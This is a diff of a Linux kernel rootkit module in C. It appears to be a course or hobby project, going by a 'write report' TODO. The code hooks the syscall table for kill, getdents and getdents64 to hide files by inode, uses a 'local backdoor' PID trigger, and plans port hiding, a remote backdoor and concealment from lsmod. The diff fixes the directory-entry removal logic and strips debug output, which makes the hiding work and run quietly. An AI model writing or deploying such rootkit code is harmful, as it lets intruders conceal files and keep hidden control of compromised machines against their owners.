@@ -10,12 +10,11 @@
 #include <linux/dirent.h>
 
 // TODO 
-// Hide files and processes
-// Non violatile hiding
+// File hiding api work
 // Hide ports and add remote backdoor
 // Hide self from lsmod and other commands
-// Find the sys_call_table programmatically
 // Cite sources and document
+// Write report
 
 // for local backdoor
 #define LOCAL_PID 12345
@@ -66,7 +65,6 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 		toAdd->inode = (unsigned long long) pid;
 		INIT_LIST_HEAD(&toAdd->list);
 		list_add_tail(&toAdd->list,&hidden_files);
-		printk(KERN_INFO "Adding inode %i\n",pid);
 		return 0;
 	}
 
@@ -91,50 +89,47 @@ getdents_ptr orig_getdents;
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                                unsigned int count)
 {
-	int actual_result, i;
+	int result, bp;
 	struct hidden_file *ptr;
-	struct linux_dirent toWorkWith;
-	struct linux_dirent *forUser;
+	char *kdirp; // char buffer so we can do pointer arithmetic by byte
+	struct linux_dirent *d;
 
-	printk(KERN_INFO "Running hacked_getdents\n");
+	// run real getdents
+	result = (*orig_getdents)(fd,dirp,count);
 
-	// check user space access and allocate kernel space linux_dirent
-	if (!access_ok(VERIFY_READ,dirp,count))
+	// copy from user to kernelspace;
+	if (!access_ok(VERIFY_READ,dirp,result))
 		return -1;
-	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
+		return -1;
+	if (copy_from_user(kdirp,dirp,result))
 		return -1;
 
-	// run real getdent and check result for files to hide
-	actual_result = (*orig_getdents)(fd,dirp,count);
-	if (actual_result > 0) { // actually read some bytes
-		printk(KERN_INFO "Checking dirp\n");
-		for (i = 0; i < actual_result / sizeof(struct linux_dirent); i++) {
-			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent)))
-				return -1;
+	// check result for files to hide
+	if (result > 0) { // actually read some bytes
+		for (bp = 0; bp < result;) {
+			d = (struct linux_dirent *) (kdirp + bp);
 			list_for_each_entry(ptr,&hidden_files,list) {
-				printk(KERN_INFO "Current inode: %lu\n", toWorkWith.d_ino);
-				printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
-				if (toWorkWith.d_ino == ptr->inode) {
-					printk(KERN_INFO "Found file to hide\n");
-					continue;
+				if (d->d_ino == ptr->inode) {
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					        result - bp - d->d_reclen);
+					result -= d->d_reclen;
+					bp -= d->d_reclen;
 				}
 			}
-			*forUser++ = toWorkWith;
+			bp += d->d_reclen;
 		}
 	}
-	else {
-		return actual_result;
-	}
 
-	// copy linux_dirent * to user space
-	if (!access_ok(VERIFY_WRITE,dirp,count))
+	// copy from kernel to userspace
+	if (!access_ok(VERIFY_WRITE,dirp,result))
 		return -1;
-	if (copy_to_user(dirp,forUser,count))
+	if (copy_to_user(dirp,kdirp,result))
 		return -1;
-	kfree(forUser);
+	kfree(kdirp);
 
-	// return actual result
-	return actual_result;
+	// return number of bytes read
+	return result;
 }
 
 typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp,
@@ -144,39 +139,32 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int actual_result, hacked_result, bp;
+	int result, bp;
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent64 *d;
 
-	printk(KERN_INFO "Running hacked_getdents64\n");
-
 	// run real getdents64 
-	actual_result = (*orig_getdents64)(fd,dirp,count);
-	hacked_result = actual_result;
+	result = (*orig_getdents64)(fd,dirp,count);
 
 	// copy from user to kernelspace;
-	if (!access_ok(VERIFY_READ,dirp,actual_result))
+	if (!access_ok(VERIFY_READ,dirp,result))
 		return -1;
-	if ((kdirp = kmalloc(actual_result,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
 		return -1;
-	if (copy_from_user(kdirp,dirp,actual_result))
+	if (copy_from_user(kdirp,dirp,result))
 		return -1;
 
 	// check result for files to hide
-	if (actual_result > 0) { // actually read some bytes
-		printk(KERN_INFO "Checking dirp\n");
-		for (bp = 0; bp < actual_result;) {
+	if (result > 0) { // actually read some bytes
+		for (bp = 0; bp < result;) {
 			d = (struct linux_dirent64 *) (kdirp + bp);
-			//d_next = (struct linux_dirent64 *) (kdirp + bp + d->d_reclen);
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if (d->d_ino == ptr->inode) {
-					printk(KERN_INFO "Found file to hide\n");
 					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-					        actual_result - bp + d->d_reclen);
-					hacked_result -= d->d_reclen;
-					//d->d_off += d_next->d_off;
-					//d->d_reclen += d_next->d_reclen;
+					        result - bp - d->d_reclen);
+					result -= d->d_reclen;
+					bp -= d->d_reclen;
 				}
 			}
 			bp += d->d_reclen;
@@ -184,14 +172,14 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	}
 
 	// copy from kernel to userspace
-	if (!access_ok(VERIFY_WRITE,dirp,hacked_result))
+	if (!access_ok(VERIFY_WRITE,dirp,result))
 		return -1;
-	if (copy_to_user(dirp,kdirp,hacked_result))
+	if (copy_to_user(dirp,kdirp,result))
 		return -1;
 	kfree(kdirp);
 
 	// return number of bytes read
-	return hacked_result;
+	return result;
 }
 
 int rootkit_init(void) {
@@ -213,9 +201,6 @@ int rootkit_init(void) {
 
 void rootkit_exit(void) {
 	struct hidden_file *ptr, *next;
-	list_for_each_entry(ptr,&hidden_files,list) {
-		printk(KERN_INFO "Inode: %llu\n",ptr->inode);
-	}
 
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
